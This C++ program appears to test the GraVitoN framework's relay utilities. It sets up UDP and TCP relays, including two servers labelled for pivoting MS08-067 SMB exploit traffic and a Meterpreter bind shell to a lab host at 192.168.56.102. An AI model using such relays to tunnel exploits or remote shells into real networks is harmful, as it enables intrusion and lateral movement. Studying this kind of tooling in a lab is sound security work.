#define GVN_ACTIVATE_LOGGER

#include <graviton.hpp>
#include <utils/component_parallel.hpp>
#include <utils/network_relay.hpp>
#include <iostream>
using namespace std;

int main()
{
    GraVitoN::Utils::Component_Parallel copa;

    GraVitoN::Core::TCP_Client cln("127.0.0.1", 7356);

    if(!cln.connect())
    {
        cout << "CANNOT CONNECT TO " << cln.getRemoteIP() << ":" << cln.getRemotePort() << endl;
        return 0;
    }

    /// Server: UDP/127.0.0.1:7357
    /// Client: UDP/127.0.0.1:7356
    /// Remote: UDP/127.0.0.1:7358
    GraVitoN::Utils::Network_Relay_UDP nrudp(7357, "127.0.0.1", 7356, "127.0.0.1", 7358);

    /// Server: TCP/127.0.0.1:rand
    /// Client: TCP/127.0.0.1:7356
    /// Remote: UDP/127.0.0.1:7358
    GraVitoN::Utils::Network_Relay_TCP_To_UDP nrtu(cln, "127.0.0.1", 7358);

    /// ms08_67
    GraVitoN::Utils::Network_Relay_TCP_Server ms08_67(31337, "192.168.56.102", 445);

    /// Meterpreter Bind
    GraVitoN::Utils::Network_Relay_TCP_Server meter_bnd(4444, "192.168.56.102", 4444);

    copa.runThis( nrudp  );
    copa.runThis( nrtu );
    copa.runThis( ms08_67 );
    copa.runThis( meter_bnd );

    while( copa.isActive() )
    {
        GraVitoN::Core::Thread::sleep(50);
    }

    cout << "DONE! (But how?!!)" << endl;

	return 0;
}
